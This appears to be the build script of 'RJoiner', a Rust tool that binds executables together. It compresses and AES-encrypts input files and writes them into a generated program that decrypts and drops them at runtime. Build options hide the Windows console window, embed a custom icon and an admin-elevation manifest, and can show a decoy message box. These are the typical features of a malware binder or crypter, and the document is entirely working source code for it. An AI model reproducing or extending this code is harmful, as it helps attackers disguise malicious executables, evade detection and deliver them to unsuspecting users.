/*
    RJoiner to join executables
    Copyright (C) 2023  ftdot

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

#![allow(dead_code)]

#[cfg(all(any(feature="icon", feature="admin"), target_os="windows"))]
extern crate embed_resource;

use std::{fs, path::PathBuf};

use aes_gcm::{
  aead::{Aead, KeyInit},
  Aes256Gcm, Nonce
};
use base64::{Engine as _, engine::general_purpose};
use rand::Rng;
use rand::distributions::Standard;

fn generate_random_nonce() -> Vec<u8> {
  rand::thread_rng().sample_iter(Standard).take(12).collect()
}

fn generate_random_key() -> Vec<u8> {
  Aes256Gcm::generate_key(rand::thread_rng()).to_vec()
}

fn read_n_encrypt_file(str_path: &str, key: &Vec<u8>) -> Option<String> {

  let path = PathBuf::from(str_path);
  let filename = path.file_name().unwrap().to_str().unwrap();

  let file_content = match fs::read(&path) {
    Err(e) => { println!("Error while reading file: {}", e); return None; }
    Ok(r) => { r }
  };

  let file_zipped = match zip(file_content) {
    Some(r) => { r }
    None => { println!("Cannot compress file"); return None; }
  };

  let nonce = generate_random_nonce();

  let cipher = match Aes256Gcm::new_from_slice(&key) {
    Err(e) => { println!("Error while initializing cipher: {}", e); return None; }
    Ok(r) => { r }
  };

  let enc_data = match cipher.encrypt(Nonce::from_slice(&nonce), file_zipped.as_ref()) {
    Err(e) => { println!("Error while encrypting : {}", e); return None; }
    Ok(r) => { r }
  };

  let nonce_b64 = general_purpose::STANDARD_NO_PAD.encode(nonce);
  let enc_data_b64 = general_purpose::STANDARD_NO_PAD.encode(enc_data);

  Some("decrypt_n_drop(\"".to_owned()+filename+"\", b\""+&nonce_b64+"\", b\""+&enc_data_b64+"\", key);")
}

fn zip(data: Vec<u8>) -> Option<Vec<u8>> {
  match yazi::compress(&data, yazi::Format::Zlib, yazi::CompressionLevel::Default) {
    Ok(r) => { Some(r) }
    Err(e) => { println!("Error while compressing data: {:?}", e); None }
  }
}

fn main() {

  let key = generate_random_key();
  let key_b64 = general_purpose::STANDARD_NO_PAD.encode(&key);

  #[allow(unused_mut)]
  let mut code_vec = Vec::<String>::new();

  //--gen-build-code--

  let mut generated_code = fs::read_to_string("template_main.rs")
                                .unwrap()
                                .replace("--key--", &key_b64)
                                .replace("//--gen-code--", &(code_vec.join("\n    ")));
  
  // Check if console for windows is enabled
  #[allow(unused_assignments)]
  if cfg!(not(feature="enable_win_console")) {
    generated_code = generated_code.replace("//--win-subsys--", "#![windows_subsystem = \"windows\"]");
  }

  // Check if console for windows is enabled
  #[allow(unused_assignments)]
  if cfg!(feature="show_messagebox") {
    generated_code = generated_code.replace("--messagebox-title--", "--msgbox-title-build--")
                                   .replace("--messagebox-text--", "--msgbox-text-build--")
                                   .replace("SHOW_MESSAGEBOX_TYPE", "--msgbox-type-build--");
  }
  
  #[cfg(feature="build")]
  fs::write("src/main.rs", generated_code).unwrap();

  // Setup icon & admin features

  #[cfg(all(feature="icon", not(feature="admin"), target_os="windows"))]
  embed_resource::compile("resources/icon.rc");

  #[cfg(all(feature="admin", not(feature="icon"), target_os="windows"))]
  embed_resource::compile("resources/admin.rc");

  #[cfg(all(feature="icon", feature="admin", target_os="windows"))]
  embed_resource::compile("resources/icon_admin.rc");

  #[cfg(all(any(feature="icon", feature="admin"), not(target_os="windows")))]
  println!("WARNING: features \"icon\" and \"admin\" available only for Windows!")
}
